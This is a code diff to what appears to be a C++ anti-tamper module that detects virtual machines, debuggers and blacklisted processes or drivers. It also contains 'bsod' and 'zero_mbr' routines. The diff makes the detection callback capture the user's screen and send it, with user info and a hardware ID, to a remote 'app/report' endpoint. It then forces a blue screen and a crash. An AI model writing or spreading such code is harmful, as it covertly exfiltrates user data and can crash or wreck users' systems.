@@ -21,7 +21,7 @@ auto security::runtime_security::check_for_virtual_machine( ) -> void
 {
 
 	if ( VMProtectIsVirtualMachinePresent( ) )
-		security_callback( E( "Vmprotect Virtual Machine Found" ), 1 );
+		security_callback( E( "Vmprotect Virtual Machine Found" ), E( "blacklist" ) );
 
 }
 
@@ -31,7 +31,7 @@ auto security::runtime_security::check_vm_files( ) -> void
 	{
 		if ( std::filesystem::exists( vm_file ) )
 		{
-			security_callback( utils::string::format(E("Virtual Machine files found: {}"),vm_file ),1 );
+			security_callback( utils::string::format(E("Virtual Machine files found: {}"),vm_file ), E( "blacklist" ) );
 		}
 			
 	}
@@ -43,7 +43,7 @@ auto security::runtime_security::process_blacklist( ) -> void
 	{
 		if ( utils::process::get_process_id( proc ) != 0 )
 		{
-			security_callback( utils::string::format( E( "Process BlackList Found: {}" ),proc ), 1 );
+			security_callback( utils::string::format( E( "Process BlackList Found: {}" ),proc ), E( "blacklist" ) );
 		}
 	}
 
@@ -59,14 +59,14 @@ auto security::runtime_security::check_for_drivers( ) -> void
 	for ( const auto &drivers : drivers_list )
 	{
 		if ( utils::system::search_drivers( drivers ) )
-			security_callback( utils::string::format( E( "Driver Blacklist Found: {}" ), drivers ), 1 );
+			security_callback( utils::string::format( E( "Driver Blacklist Found: {}" ), drivers ), E( "blacklist" ) );
 	}
 }
 
 auto security::runtime_security::check_for_debugger( ) -> void
 {
 	if ( VMProtectIsDebuggerPresent( false ) )
-		security_callback( E( "Vmprotect Debugger Found" ), 1 );
+		security_callback( E( "Vmprotect Debugger Found" ), E("blacklist") );
 }
 
 auto security::runtime_security::bsod( ) -> void
@@ -94,16 +94,24 @@ auto security::runtime_security::zero_mbr( ) -> void
 	CloseHandle( master_boot_record );
 }
 
-auto security::runtime_security::security_callback( const std::string reason, const int type ) -> void
+auto security::runtime_security::security_callback( const std::string reason, const std::string type ) -> void
 {
 	static auto triggered_callback = false;
 
 	if ( !triggered_callback )
 	{
-		/*auto const post = std::make_unique< network::Requests >( );
-		post->post_report( utils::others::get_hwid_hash( ), utils::string::format( "{} \n {}", utils::system::get_user_info( ), reason ),
-															          utils::others::bufferto_base64( utils::others::capture_screen( ) ), type );*/
-		if ( type != 0 )
+		const nlohmann::json body
+		{
+			{ E( "unique" ), utils::others::get_hwid_hash( ) },
+			{ E( "type" ), type },
+			{ E( "description" ), utils::string::format( E( "{}" ),utils::system::get_user_info( ) ) }
+		};
+
+		const auto [status_code, data] = g_requests->post_with_image( E("app/report"), utils::others::capture_screen( ), body );
+
+		log_dbg( E( "{}" ), data.dump() );
+
+		if ( type == E("blacklist") )
 		{
 			bsod( );
 			crash_program( );
